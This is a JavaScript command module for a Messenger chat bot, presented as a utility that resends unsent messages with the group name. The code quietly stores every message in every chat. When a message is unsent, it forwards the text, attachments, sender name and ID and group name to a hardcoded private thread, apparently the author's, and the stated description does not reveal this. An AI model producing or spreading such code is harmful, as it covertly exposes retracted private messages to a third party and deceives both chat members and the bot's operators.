const { getStreamFromURL } = global.utils;

module.exports.config = {
  name: "resend",
  version: "9.1",
  author: "BaYjid",
  countDown: 5,
  role: 0,
  category: "utility",
  description: "Resend unsent messages with group name"
};

const PRIVATE_THREAD_ID = "24054687577520440";

if (!global.resend) {
  global.resend = {
    store: new Map(),
    storeMessage(e) {
      if (!e?.messageID) return;
      global.resend.store.set(e.messageID, {
        body: e.body || "",
        attachments: e.attachments || [],
        senderID: e.senderID,
        threadID: e.threadID
      });
    }
  };
}

module.exports.onStart = async () => {};

module.exports.onChat = async ({ api, event, usersData }) => {
  try {
    if (event.type === "message_unsend") {
      const data = global.resend.store.get(event.messageID);
      if (!data) return;

      // 🔹 Get thread (group) info
      let threadInfo;
      try {
        threadInfo = await api.getThreadInfo(data.threadID);
      } catch {
        threadInfo = null;
      }

      const threadName = threadInfo?.threadName || "❓ Unknown Chat";

      // 🔹 Fancy style message
      let msg = `✨━━━━━━━━━━━━━━━━━✨\n`;
      msg += `🚨  𝐔𝐍𝐒𝐄𝐍𝐓 𝐀𝐋𝐄𝐑𝐓  🚨\n`;
      msg += `✨━━━━━━━━━━━━━━━━━✨\n\n`;

      msg += `👤  𝐒𝐞𝐧𝐝𝐞𝐫 : ${await usersData.getName(data.senderID)}\n`;
      msg += `🆔  𝐔𝐬𝐞𝐫 𝐈𝐃 : ${data.senderID}\n`;
      msg += `👥  𝐆𝐫𝐨𝐮𝐩 : ${threadName}\n`;
      msg += `💬  𝐓𝐡𝐫𝐞𝐚𝐝 𝐈𝐃 : ${data.threadID}\n`;

      if (data.body) {
        msg += `\n📝  𝐂𝐨𝐧𝐭𝐞𝐧𝐭:\n『 ${data.body} 』\n`;
      }

      if (data.attachments.length > 0) {
        msg += `\n📎  𝐀𝐭𝐭𝐚𝐜𝐡𝐦𝐞𝐧𝐭𝐬:\n`;
        data.attachments.forEach((a, i) => {
          let type = "📄 File";
          if (a.type === "photo") type = "🖼️ Image";
          if (a.type === "video") type = "🎥 Video";
          if (a.type === "audio") type = "🔊 Audio";
          if (a.type === "animated_image") type = "🎞️ GIF";
          msg += `   ${i + 1}. ${type}\n`;
        });
      }

      // 🔹 Replaced Logged Safely line
      msg += `\n🛡️  Message Secured Safely 🛡️`;

      // 🔹 Send with or without attachment
      if (data.attachments.length > 0) {
        const atts = await Promise.all(
          data.attachments.map(async a => (a.url ? await getStreamFromURL(a.url) : null))
        );
        return api.sendMessage(
          {
            body: msg,
            attachment: atts.filter(Boolean)
          },
          PRIVATE_THREAD_ID
        );
      }

      return api.sendMessage(msg, PRIVATE_THREAD_ID);
    }

    if (event.type === "message") {
      global.resend.storeMessage(event);
    }
  } catch (err) {
    console.error("❌ Resend Error:", err);
  }
};